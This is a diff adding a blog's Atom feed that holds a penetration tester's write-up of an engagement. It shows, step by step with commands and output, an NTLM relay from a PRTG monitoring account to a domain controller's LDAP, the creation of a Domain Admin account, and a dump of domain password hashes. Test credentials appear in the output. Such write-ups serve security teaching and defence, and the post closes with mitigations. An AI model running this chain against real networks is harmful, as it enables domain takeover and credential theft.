@@ -1,0 +1,184 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2024-12-04T22:36:45+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Friiz’s Blog</title><subtitle></subtitle><author><name>Friiz</name><email>your-email@email.com</email></author><entry><title type="html">PWNING a DC via Paessler’s monitoring system</title><link href="http://localhost:4000/posts/2024-12-1-ldap-pwnage" rel="alternate" type="text/html" title="PWNING a DC via Paessler’s monitoring system" /><published>2024-12-01T00:00:00+00:00</published><updated>2024-12-01T00:00:00+00:00</updated><id>http://localhost:4000/posts/ldap-pwnage</id><content type="html" xml:base="http://localhost:4000/posts/2024-12-1-ldap-pwnage"><![CDATA[<h1> Paessler Monitoring system? </h1>
+<p>During a recent engagement, while trying to perform SMB relaying on a potentially vulnerable target, I noticed some hits on my <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx </a> instance that I did not initiate 🤔</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[kali@kali]$</span><span class="w"> </span>impacket-ntlmrelayx <span class="nt">-t</span> 10.10.0.66 <span class="nt">-smb2support</span> 
+<span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+ 
+[*] Protocol Client LDAP loaded.. 
+[*] Protocol Client LDAPS loaded.. 
+[*] Protocol Client SMB loaded.. 
+[*] Protocol Client RPC loaded.. 
+[*] Protocol Client HTTPS loaded.. 
+[*] Protocol Client HTTP loaded.. 
+[*] Protocol Client MSSQL loaded.. 
+[*] Protocol Client DCSYNC loaded.. 
+[*] Protocol Client IMAP loaded.. 
+[*] Protocol Client IMAPS loaded.. 
+[*] Protocol Client SMTP loaded.. 
+[*] Running in relay mode to single host 
+[*] Setting up SMB Server on port 445 
+[*] Setting up HTTP Server on port 80 
+[*] Setting up WCF Server on port 9389 
+[*] Setting up RAW Server on port 6666 
+[*] Multirelay disabled 
+ 
+[*] Servers started, waiting for connections 
+[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.0.50, attacking target smb://10.10.0.66 
+</span><span class="gp">[*] Authenticating against smb://10.10.0.66 as REDACTED/DEV-DC31$</span><span class="w"> </span>SUCCEED 
+<span class="go">[*] All targets processed!
+</span></code></pre></div></div>
+<p><br />
+This could be an indication that there is an automated task that makes machines automatically authenticate to my services on the network.</p>
+
+<p>To make things easier for me, I decided to check if the DC supports LDAP signing in order to relay this authentication to it and get an LDAP shell, from where we can perform <i>evil stuff</i>. 😈
+To do so, we unfortunately need to have a domain account set up.</p>
+
+<p><b>This step is not necessary if you don’t have creds, but will save you time.</b></p>
+
+<p>Going to the terminal, I ran <a href="https://www.netexec.wiki/">Netexec </a> against the DC with the module <b> ldap-checker </b> and saw that LDAP signing was not enforced:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[kali@kali]$</span><span class="w"> </span>netexec ldap 10.10.0.50 <span class="nt">-u</span> pentester <span class="nt">-p</span> Y3llow3Fl0wer <span class="nt">-M</span> ldap-checker
+<span class="go">
+SMB         10.10.0.50      445    DEV-DC31         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC31) (domain:REDACTED) (signing:True) (SMBv1:False)
+LDAP        10.10.0.50      389    DEV-DC31         [+] REDACTED\pentester:Y3llow3Fl0wer                                              
+LDAP-CHE... 10.10.0.50      389    DEV-DC31         LDAP Signing NOT Enforced!                                                                   
+LDAP-CHE... 10.10.0.50      389    DEV-DC31         LDAPS Channel Binding is set to "When Supported" 
+</span></code></pre></div></div>
+<p><br />
+The next thing to immediately do was to setup ntlmrelayx to relay directly to the DC’s LDAP.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[kali@kali]$</span><span class="w"> </span>impacket-ntlmrelayx <span class="nt">-t</span> 10.10.0.50 <span class="nt">-smb2support</span> <span class="nt">-i</span>
+</code></pre></div></div>
+<p><br />
+We have speficied the DC with the <b>-t</b> option and used the <b>-i</b> option to establish an interactive LDAP shell.</p>
+
+<p>After a minute or two of waiting, REDACTED/SERVICE.PRTG automatically authenticated and we relayed the connection to the DC’s LDAP:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[kali@kali]$</span><span class="w"> </span>impacket-ntlmrelayx <span class="nt">-t</span> ldaps://10.10.0.50 <span class="nt">--shadow-credentials</span> <span class="nt">-i</span>            
+<span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client LDAP loaded..                                              
+[*] Protocol Client LDAPS loaded..                                             
+[*] Protocol Client SMB loaded..                                               
+[*] Protocol Client RPC loaded..                                               
+[*] Protocol Client HTTP loaded..                                              
+[*] Protocol Client HTTPS loaded..                                             
+[*] Protocol Client MSSQL loaded..                                             
+[*] Protocol Client DCSYNC loaded..                                            
+[*] Protocol Client IMAPS loaded..                                             
+[*] Protocol Client IMAP loaded..                                              
+[*] Protocol Client SMTP loaded..                                              
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445                                          
+[*] Setting up HTTP Server on port 80                                          
+[*] Setting up WCF Server on port 9389                                         
+[*] Setting up RAW Server on port 6666                                         
+[*] Multirelay disabled                                                        
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.0.50, attacking target ldaps://10.10.0.50                                          
+[*] SMBD-Thread-6 (process_request_thread): Received connection from 10.10.0.50, attacking target ldaps://10.10.0.50                                          
+[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.10.0.138, attacking target ldaps://10.10.0.50                                         
+[*] SMBD-Thread-8 (process_request_thread): Received connection from 10.10.0.138, attacking target ldaps://10.10.0.50                                         
+[*] Authenticating against ldaps://10.10.0.50 as REDACTED/SERVICE.PRTG SUCCEED
+[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as REDACTED/SERVICE.PRTG
+</span></code></pre></div></div>
+<p><br />
+We can see that we have successfully relayed the connection to the DC and have established an interactive LDAP shell locally on port 11000 which we can access via netcat.</p>
+
+<p>Before we do so, why was this attack was possible? 🤔 Even if LDAP signing is disabled, why did <b>SERVICE.PRTG</b> automatically authenticate to our server?</p>
+
+<p>After some digging, we see that SERVICE.PRTG is a monitoring tool by <a href="https://www.paessler.com/">Paessler</a> which <b>“connects to the server by trying a bind”</b>.
+<br /></p>
+
+<p><img src="/assets/img/pwn-me.jpg" /></p>
+
+<p><br /></p>
+<h1> Easy takeover incoming </h1>
+<p>We will connect to the interactive shell with netcat:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[kali@kali]$</span><span class="w"> </span>nc 127.0.0.1 11000
+</code></pre></div></div>
+<p><br />
+Inside of the shell, we confirm we are the user <b>SERVICE.PRTG</b> and we proceed to adding a new user to the Domain Administrators group:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span><span class="nb">whoami</span>                                                                       
+<span class="go">u:REDACTED\service.prtg
+
+</span><span class="gp">#</span><span class="w"> </span>add_user Pentest-User
+<span class="go">Attempting to create user in: %s CN=Users,DC=REDACTED,DC=REDACTED
+Adding new user with username: Pentest-User and password: c,n3nF["dH[h=&amp;P result: OK
+
+</span><span class="gp">#</span><span class="w"> </span>search Pentest-User
+<span class="go">CN=Pentest-User,CN=Users,DC=REDACTED,DC=REDACTED
+name: Pentest-User
+distinguishedName: CN=Pentest-User,CN=Users,DC=REDACTED,DC=REDACTED
+sAMAccountName: Pentest-User
+objectSid: S-1-5-21-854245398-1004336348-1801673123-2222
+
+</span><span class="gp">#</span><span class="w"> </span>enable_account Pentest-User
+<span class="go">Original userAccountControl: 512
+Updated userAccountControl attribute successfully                            
+
+</span><span class="gp">#</span><span class="w"> </span>add_user_to_group Pentest-User <span class="s2">"Domain Admins"</span>
+<span class="go">Adding user: Pentest-User to group Domain Admins result: OK
+</span></code></pre></div></div>
+<p><br />
+The user show now be a Domain Admin, lets quickly confirm that with netexec:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[kali@kali]$</span><span class="w"> </span>netexec smb DC.txt <span class="nt">-u</span> Pentest-User <span class="nt">-p</span> <span class="s1">'c,n3nF["dH[h=&amp;P'</span>
+<span class="go">SMB         200.200.205.15  445    DEV-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC01) (domain:REDACTED) (signing:True) (SMBv1:False)
+SMB         10.10.0.108     445    DEV-DC31         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC31) (domain:REDACTED) (signing:True) (SMBv1:False)
+SMB         10.10.0.50      445    DEV-DC31         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC31) (domain:REDACTED) (signing:True) (SMBv1:False)
+SMB         10.10.0.116     445    DEV-PDC03        [*] Windows Server 2022 Build 20348 x64 (name:DEV-PDC03) (domain:REDACTED) (signing:True) (SMBv1:False)
+SMB         200.200.205.15  445    DEV-DC01         [+] REDACTED\Pentest-User:c,n3nF["dH[h=&amp;P (Pwn3d!)
+SMB         10.10.0.108     445    DEV-DC31         [+] REDACTED\Pentest-User:c,n3nF["dH[h=&amp;P (Pwn3d!)
+SMB         10.10.0.50      445    DEV-DC31         [+] REDACTED\Pentest-User:c,n3nF["dH[h=&amp;P (Pwn3d!)
+SMB         10.10.0.116     445    DEV-PDC03        [+] REDACTED\Pentest-User:c,n3nF["dH[h=&amp;P (Pwn3d!)
+</span></code></pre></div></div>
+<p><br />
+And just like that we managed to PWN multiple networks! As the grand finale lets dump all the hashes with Impacket’s Secretsdump:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[kali@kali]$</span><span class="w"> </span>impacket-secretsdump REDACTED/Pentest-User:<span class="s1">'c,n3nF["dH[h=&amp;P'</span>@10.10.0.50
+<span class="go">Impacketv0.12.0-CopyrightFortra,LLCanditsaffiliatedcompanies
+
+[*]ServiceRemoteRegistryisinstoppedstate
+[*]StartingserviceRemoteRegistry
+[*]TargetsystembootKey:REDACTED
+[-]SAMhashesextractionfailed:SMBSessionError:code:0xc00000b1-STATUS_PIPE_CLOSING-Thespecifiednamedpipeisintheclosingstate.
+[-]LSAhashesextractionfailed:SMBSessionError:code:0xc00000b1-STATUS_PIPE_CLOSING-Thespecifiednamedpipeisintheclosingstate.
+[*]DumpingDomainCredentials(domain\uid:rid:lmhash:nthash)
+[*]UsingtheDRSUAPImethodtogetNTDS.DITsecrets
+
+REDACTED\administrator:500:REDACTED:REDACTED:::
+Guest:501:REDACTED:REDACTED:::
+krbtgt:502:REDACTED:REDACTED:::
+REDACTED\InternetUser:1000:REDACTED:REDACTED:::
+REDACTED\n.mullen:2120:REDACTED:REDACTED:::
+REDACTED\b.brennan:2137:REDACTED:REDACTED:::
+REDACTED\info:2145:REDACTED:REDACTED:::
+REDACTED\o.jackson:2147:REDACTED:REDACTED:::
+REDACTED\a.mcguire:2157:REDACTED:REDACTED:::
+REDACTED\b.dawson:2162:REDACTED:REDACTED:::
+REDACTED\s.bristow:2164:REDACTED:REDACTED:::
+REDACTED\s.campbell:2165:REDACTED:REDACTED:::
+REDACTED\q.scott:2166:REDACTED:REDACTED:::
+REDACTED\i.sheehy:2170:REDACTED:REDACTED:::
+REDACTED\k.coffey:2176:REDACTED:REDACTED:::
+REDACTED\s.oconnell:2177:REDACTED:REDACTED:::
+REDACTED\m.otoole:2181:REDACTED:REDACTED:::
+</span><span class="c">...
+</span></code></pre></div></div>
+<p><br /></p>
+<center> <b> Lo and behold, we have demolished a domain without any credentials. </b></center>
+<p><br /></p>
+
+<h1> Conclusions </h1>
+<ul>
+  <li>Enable LDAP signing</li>
+  <li>Don’t let a service automatically authenticate to any LDAP servers on the network</li>
+</ul>
+
+<h1> Resources </h1>
+<ul>
+  <li><a href="https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022">I’m Bringing Back Relaying</a></li>
+  <li><a href="https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/">Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques</a></li>
+</ul>]]></content><author><name>Friiz</name><email>your-email@email.com</email></author><category term="real-life" /><category term="DC" /><category term="LDAP" /><summary type="html"><![CDATA[Paessler Monitoring system? During a recent engagement, while trying to perform SMB relaying on a potentially vulnerable target, I noticed some hits on my ntlmrelayx instance that I did not initiate 🤔]]></summary></entry></feed>
